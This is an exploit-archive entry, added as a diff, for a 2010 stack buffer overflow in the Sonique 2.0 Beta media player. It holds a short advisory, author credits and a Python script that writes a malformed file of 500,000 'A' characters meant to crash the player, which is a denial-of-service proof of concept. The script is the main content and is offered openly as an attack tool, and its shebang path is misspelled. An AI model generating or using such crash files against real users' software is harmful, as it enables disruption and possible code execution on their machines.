@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/42434/info
+
+Sonique is prone to a remote stack-based buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied input.
+
+Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.
+
+Sonique 2.0 Beta Build 103 is vulnerable; other versions may also be affected. 
+
+#Date: 12/8/2010                                                                            
+#Author:Hamza_hack_dz & Black-liondz1                                                      
+#Software Link:Download: http://www.softpedia.com/progDownload/Sonique-2-Download-6707.html #                                                                          #
+#Version:sonique2                                                                           
+# web:www.sa-hacker.com/vb
+# Email:hamza_hack_dz@hotmail.com &b-l@ho9mail.com                                           
+
+                        
+#!/user/bin/python
+
+filename = "sa-hacker.xpl"
+
+junk = "\x41" * 500000
+
+exploit = junk
+
+textfile = open(filename,'w')
+textfile.write(exploit)
+textfile.close()
+
+
+# Inj3ct0r.com [2010-08-12]
